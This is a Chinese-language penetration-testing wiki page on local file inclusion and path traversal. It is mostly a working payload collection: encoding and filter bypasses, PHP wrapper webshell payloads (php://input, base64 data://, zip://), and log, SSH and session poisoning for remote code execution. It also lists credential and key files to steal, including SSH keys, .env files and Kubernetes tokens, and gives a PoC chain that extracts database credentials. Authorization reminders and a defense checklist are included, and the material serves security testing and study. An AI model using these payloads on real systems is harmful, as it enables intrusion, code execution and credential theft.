---
type: wiki
category: attack
tool: lfisuite,burp,manual
status: active
last-updated: 2026-04-21
---

# LFI / Path Traversal 深度（2026 版）

> **用途：** 讀取任意檔案（P2-P3）。若可搭 log poisoning / session file / PHP wrapper → RCE（P1）。`../../../` 的背後有 20+ 繞法。

## 0. 基礎

```
?file=../../etc/passwd
?file=..\..\windows\win.ini
?file=/etc/passwd
?file=file:///etc/passwd
```

但 WAF / input validation 會擋 — 本文列全繞法。

## 1. 傳統 bypass

### 1.1 Encoding

```
../                      標準
..%2f                    URL encoded
..%252f                  Double URL encoded
%2e%2e%2f                全 encoded
%2e%2e/                  部分
..%c0%af                 UTF-8 overlong (apache)
..%ef%bc%8f              全形 /
```

### 1.2 `..` 被過濾

```
....//                   若只 remove 一次 ".."
.%252e/                  double encoded
.\./                     包 backslash
```

### 1.3 null byte（PHP < 5.3.4）

```
?file=../../../etc/passwd%00.jpg
```

### 1.4 Base path 被 append

當 server 自動加 `.php`：

```
?file=../../../etc/passwd%00         # null byte 老版
?file=../../../etc/passwd#           # 部分 parser 把 # 後忽略
?file=../../../etc/passwd/.          # 多 . 繞
?file=../../../etc/passwd?.php       # 部分把 ? 當 URL query
```

### 1.5 Path normalization 差異

```
?file=/./etc/./passwd
?file=/./etc/passwd/..  → resolve 成 /etc
?file=./../etc/passwd
```

## 2. PHP wrapper（大殺器）

### 2.1 php://filter — 讀 PHP 原始碼

```
?file=php://filter/convert.base64-encode/resource=index.php
→ Response base64 decode → 得到 PHP 原始碼
```

Chain 多個 filter：

```
?file=php://filter/read=string.rot13|convert.base64-encode/resource=/etc/passwd
```

### 2.2 php://input — POST body 直接當 PHP code（需 allow_url_include=On）

```bash
curl -X POST "https://target.com/?file=php://input" \
  -d '<?php system($_GET["c"]);?>'
```

### 2.3 data:// — data URL 直接 RCE

```
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOz8+
```

需 `allow_url_include=On`。

### 2.4 expect:// — 若 expect extension 裝了（少見）

```
?file=expect://id
```

### 2.5 zip:// / phar:// — 配上傳

```bash
# 構造 zip
echo '<?php system($_GET["c"]);?>' > s.php
zip x.zip s.php
# 上傳 x.zip 後：
?file=zip:///var/www/uploads/x.zip%23s.php&c=id
# 注意 # 要 URL encode 成 %23
```

### 2.6 phar:// 鏈 deserialization

詳見 [67-deserialization.md](67-deserialization.md) Phar section。

## 3. Log poisoning → RCE

### 3.1 Apache / Nginx access log

```
# Step 1: 送惡意 UA
curl -A '<?php system($_GET["c"]);?>' https://target.com/

# Step 2: LFI 讀 log
?file=../../../var/log/apache2/access.log&c=id
→ log 被當 PHP 執行
```

**Log path 清單**：

```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log              # SSH 失敗帳號 = UA 類比
/var/log/mail.log
/var/log/messages
```

### 3.2 SSH log poisoning

```
# ssh invalid:"<?php system($_GET['c']);?>"@target.com
# /var/log/auth.log 記錄使用者名，包含 PHP code
# 再 LFI 讀 auth.log
```

### 3.3 /proc/self/environ（舊 Linux）

```
?file=/proc/self/environ
# 若可讀（多數新 kernel 已限制） → UA 塞 PHP code 觸發
```

### 3.4 Session file poisoning

```
# PHP session 檔：/var/lib/php/sessions/sess_<PHPSESSID>
# 內含 user-controlled data（username, preferences）
# 把 username 改成 <?php ... ?>
# LFI 讀 sess_xxx → 執行
```

### 3.5 /proc/self/fd/<N>

```
?file=/proc/self/fd/0
?file=/proc/self/fd/5     # stdin / request body
```

## 4. LFI → SSRF（Windows）

```
?file=\\\\attacker\\share\\file         # SMB
?file=\\\\attacker@80\\x                 # webdav
```

## 5. 檔案清單（常見目標）

### 5.1 Linux

```
/etc/passwd
/etc/shadow              # 需 root
/etc/hosts
/etc/hostname
/etc/issue
/etc/os-release
/proc/version
/proc/cmdline
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/self/cwd/app.py
/proc/sched_debug        # list all processes
/root/.bash_history
/root/.ssh/id_rsa
/home/<user>/.ssh/id_rsa
/home/<user>/.bash_history
/var/log/apache2/access.log
/var/log/auth.log
/var/www/html/index.php  # 讀原始碼找 credentials
/var/www/html/config.php
/var/www/html/.env
```

### 5.2 Windows

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Users\<user>\.ssh\id_rsa
C:\inetpub\wwwroot\web.config
```

### 5.3 Framework config

```
/var/www/html/wp-config.php          # WordPress
/var/www/html/config/database.yml    # Rails
/app/config/parameters.yml           # Symfony
/app/.env                            # Laravel / Rails 6+
/app/config/database.yml             # Rails
/app/application.properties          # Spring Boot
/app/config.json                     # Node.js
```

### 5.4 K8s pod

```
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/namespace
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

## 6. 偵測自動化

### 6.1 ffuf

```bash
ffuf -u 'https://target.com/page?file=FUZZ' \
  -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fs 0 -mr 'root:|win.ini'
```

### 6.2 LFISuite

```bash
git clone https://github.com/D35m0nd142/LFISuite
python2 lfisuite.py
```

### 6.3 Nuclei LFI templates

```bash
nuclei -u https://target.com -tags lfi,traversal
```

### 6.4 Burp Pro scanner + Param Miner

## 7. 「只允許特定路徑 prefix」繞法

### 7.1 Prefix-check bypass

```python
# 假檢查
if filename.startswith('/var/uploads/'):
    open(filename)
```

```
?file=/var/uploads/../../../etc/passwd
→ startswith 通過，但路徑 resolve 跳出
```

### 7.2 Null byte（老語言）

```
?file=/var/uploads/%00/../../etc/passwd
```

### 7.3 Symlink 攻擊

若可上傳 → 上傳一個 symlink 到 /etc/passwd → 再 LFI。

### 7.4 UTF-8 overlong

```
?file=..%c0%af..%c0%afetc%c0%afpasswd     # %c0%af == /
```

## 8. 完整 PoC：PHP LFI → php://filter → DB creds → RCE chain

### Step 1: 偵測

```bash
curl "https://target.com/view?page=../../../../etc/passwd"
# Response 含 "root:x:0:0:" → LFI 確認
```

### Step 2: 讀 PHP 原始碼

```bash
curl -s "https://target.com/view?page=php://filter/convert.base64-encode/resource=../../../../var/www/html/config.php" \
  | base64 -d

# 輸出
# <?php
# $DB_HOST = 'internal-db.local';
# $DB_USER = 'webapp';
# $DB_PASS = 'Supersecret123';
# ?>
```

### Step 3: 驗證 — 不碰 DB，只報告

**停。** PoC 到這裡已經足夠 P2-P1。不要連進 DB。

### Step 4: 若允許更深（有帳號 + 授權）

```bash
# 內網 DB 走 VPN
mysql -h internal-db.local -u webapp -p
# 確認 creds 有效，證明攻擊鏈

# 完成後立刻關閉，不 dump data
```

### Step 5: 報告

```markdown
## 漏洞概述
https://target.com/view?page= 未驗證 file path，直接用 include()，
可透過 ../ 讀任意檔案。配合 php://filter 可讀 PHP 原始碼，進一步取得
DB credentials 可登入內網 MySQL。

## PoC
[3 curl：passwd probe + base64 read config + redacted creds]

## Impact
- 任意檔案讀取（/etc/passwd, SSH keys, app config）
- PHP 原始碼完整外洩
- Hardcoded DB credentials in config.php → 內網 DB 存取（VPN within-scope 測試確認）
- 若可上傳檔案 → LFI → RCE（log poisoning / phar）

## Severity
P2（LFI 本身）/ P1（鏈到內網 DB）

## 修補
1. realpath() 後驗證 prefix 在白單
2. 禁用 allow_url_include
3. File parameter 用 ID 代替 path（{page:1} → 映射到實際檔）
4. open_basedir restrict
5. 日誌目錄權限 700 aproximately
```

## 9. 防禦 checklist

```
1. 絕不把 user input 直接進 include / require / fopen
2. 白單檔名（{1:'about.html', 2:'contact.html'}）
3. 若必須動態 path：realpath() + startswith 白單目錄
4. 禁 allow_url_include / allow_url_fopen（php.ini）
5. open_basedir limit（PHP）
6. File upload 嚴格 ext / MIME / magic（見 [62]）
7. Log 檔權限 700（non-www user 不可讀）
8. SessionHandler 設獨立目錄 + 難猜檔名
9. /proc/self/environ 核心層面限制（容器 read_only rootfs）
```

## 關聯文件

- [62-file-upload-exploitation.md](62-file-upload-exploitation.md) — zip:// / phar:// 配合
- [66-ssrf-deep.md](66-ssrf-deep.md) — file:// / SSRF 延伸
- [67-deserialization.md](67-deserialization.md) — phar deserialization
- [75-xxe-deep.md](75-xxe-deep.md) — PHP wrapper in XXE
- PortSwigger Path Traversal：https://portswigger.net/web-security/file-path-traversal
- PayloadsAllTheThings LFI：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- LFISuite：https://github.com/D35m0nd142/LFISuite
